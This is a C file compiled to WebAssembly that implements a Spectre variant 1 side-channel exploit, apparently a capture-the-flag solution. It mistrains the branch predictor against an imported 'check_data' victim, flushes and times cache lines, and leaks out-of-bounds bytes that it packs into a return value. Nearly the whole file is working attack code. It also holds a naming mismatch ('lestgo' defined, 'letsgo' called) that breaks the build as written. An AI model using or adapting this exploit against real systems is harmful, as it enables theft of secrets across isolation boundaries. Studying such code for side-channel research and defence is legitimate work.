#include <stdio.h>

#define WASM_EXPORT __attribute__((visibility("default")))

/*
WASM_EXPORT
int main(void) {
  printf("Hello World\n");
}
*/

/* External function that is implemented in JavaScript. */
extern void env();
extern void debug_flush(unsigned long long int);
extern void debug_read(unsigned long long int);
extern void check_data(unsigned int);
extern unsigned long long int get_data_size();
extern unsigned long long int get_data3();
extern unsigned long long int get_data5();
extern unsigned long long int debug_ts();

/*
debug_read(caching size)

void __cdecl check_data(size_t idx)
{
  if ( data_size > idx )
    temp &= *(&data5.data_ptr + 0x200 * *(&data3.data_ptr + idx));
}

*/

int lestgo(size_t malicious_x) {

  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register unsigned long long int time1, time2;
  volatile unsigned char * addr;

  unsigned long long int data5 = get_data5();
  unsigned long long int data3 = get_data3();
  unsigned long long int data_size = data3 - 0x10;


  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      debug_flush(data5 + i * 512); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % 0x10;
    for (j = 29; j >= 0; j--) {
      debug_flush(data_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      check_data(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      time1 = debug_ts();
      debug_read(data5 + mix_i * 512);
      if (debug_ts() - time1 <= 500)
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 128; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/

  return j;
}

WASM_EXPORT
int this_is_what_ive_got() {

  int i;
  unsigned int j = 0;
  int idx__ = 4;
  size_t malicious_x;
  for (i=0; i<3; i++) {
    malicious_x = 0x100 + idx__ + i;
    j += letsgo(malicious_x);
    j <<= 8;
  }

  malicious_x = 0x100 + idx__ + i;
  j += letsgo(malicious_x);


  return j;
}

